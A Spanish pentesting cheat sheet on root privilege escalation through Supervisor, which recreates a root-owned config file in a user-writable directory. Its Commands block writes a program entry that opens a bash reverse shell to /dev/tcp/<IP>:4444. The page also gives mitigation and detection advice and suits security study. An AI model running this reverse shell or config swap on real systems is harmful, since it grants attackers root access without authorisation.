---
topic: Supervisor — reemplazo de configuración por permisos del directorio
tags: [linux, supervisor, permissions, privesc]
---

# Supervisor — reemplazo de configuración por permisos del directorio

[🌐 English](supervisor-config-directory-replace.en.md) | **Español**

## Concepto

Supervisor lee archivos de configuración y ejecuta los programas definidos como root. Si el archivo pertenece a root pero está en un directorio escribible por el usuario, se puede borrar y recrear aunque no se pueda editar. Los permisos del directorio anulan la protección del archivo.

## Cuándo aplica

- Supervisor se ejecuta como root y carga configuración de un directorio de usuario.
- El archivo es de root pero el directorio permite borrar y crear.
- Se busca ejecución como root sin tocar el archivo original.

## Procedimiento

1. Localizar los archivos y directorios de configuración.
2. Comprobar permisos del archivo y del directorio.
3. Borrar el archivo y recrearlo con un programa malicioso.
4. Esperar la recarga o reiniciar el servicio.

## Comandos

```bash
ls -la /home/<USER>/config/
rm /home/<USER>/config/supervisord.conf
printf '[program:x]\ncommand=/bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"\n' > /home/<USER>/config/supervisord.conf
supervisorctl reread
```

## Variantes

- Añadir un archivo en `conf.d` si el directorio es escribible.
- Cambiar el `command` de un programa existente.
- Aprovechar un enlace simbólico para apuntar a otra ruta.

## Limitaciones

- Supervisor debe recargar la configuración.
- El archivo puede tener atributos inmutables.
- SELinux/AppArmor pueden bloquear la escritura.

## Mitigación

- Montar configuraciones como solo lectura en directorios no escribibles.
- Ejecutar Supervisor sin root y validar la propiedad.
- Auditar permisos de directorios de configuración.

## Detección

- Cambios en archivos de Supervisor fuera de despliegues.
- Programas nuevos ejecutados por `supervisord`.
- Borrados y recreaciones de configuración.

## Referencias

- [0xdf — LaCasaDePapel](https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html)
- [Supervisor — Configuration](http://supervisord.org/configuration.html)
- [CWE-732 — Incorrect Permission Assignment](https://cwe.mitre.org/data/definitions/732.html)
